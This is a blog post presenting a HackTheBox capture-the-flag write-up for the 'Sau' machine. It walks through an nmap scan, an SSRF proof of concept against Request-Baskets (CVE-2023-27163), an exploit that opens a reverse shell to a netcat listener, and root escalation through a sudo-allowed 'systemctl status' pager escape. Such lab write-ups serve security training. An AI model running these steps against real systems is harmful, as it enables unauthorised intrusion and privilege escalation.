@@ -1,0 +1,100 @@
+---
+layout: page
+title: "Sau "
+date:   2025-07-10 12:05:57 -0400
+categories: writeups
+---
+
+# Sau
+
+HackTheBox: Medium
+
+<aside>
+💡 Sau is a medium linux machine which exploit vulnerabilities due to older versions
+
+</aside>
+
+## 1: Enumeration
+
+- Scanning ports
+
+```bash
+$ sudo nmap -n -Pn -p- 10.129.229.26
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 21:32 PDT
+Nmap scan report for 10.129.229.26
+Host is up (0.27s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+80/tcp    filtered http
+8338/tcp  filtered unknown
+55555/tcp open     unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 1388.12 seconds
+```
+
+We have a web service at 55555 it allows inspect and depure http requests 
+
+It is vulnerable to (CVE-2023-27163) 
+
+```bash
+$ ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80
+Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163
+
+> Creating the "sbqmby" proxy basket...
+> Basket created!
+> Accessing http://10.10.11.234:55555/xsikpk now makes the server request to http://127.0.0.1:80.
+> Authorization: FfWcOUyPi4nGFDSfzSDz_9NrvirREpBzXqJQoiy0-2DqK5NM
+```
+
+That POC make a reques to 80 port and we can get to it
+
+## 2: User flag
+
+![Untitled]({{ '/assets/images/6fd0d9dd-d49e-4e79-91de-37466e0d34f5-export-216ae02a-fe78-48b7-9c84-c96a4313992c/6fd0d9dd-d49e-4e79-91de-37466e0d34f5-export-216ae02a-fe78-48b7-9c84-c96a4313992c_Untitled.png' | relative_url }})
+
+We find a Maltrail service running with an unprotected version
+
+We find another POC 
+
+```bash
+$ python3 exploit.py 10.10.14.246 4444 http://10.10.11.234:55555/sbqmby
+Running exploit on http://10.10.11.234:55555/sbqmby
+```
+
+```bash
+$ nc -nlvp 4444
+listening on [any] 4444...
+connect to [10.10.14.246] from (UNKNOWN) [10..10.11.234] 38442
+$ whoami
+whoami
+puma
+```
+
+## 3: Priv esc
+
+Check for privileges
+
+```bash
+$ sudo -l
+sudo -l
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+```
+
+It appears that we are able to examine the trail.service's status.
+
+```bash
+sudo /usr/bin/systemctl status
+
+while it load
+
+!/bin/sh -- !sh
+
+We are root
+
+```
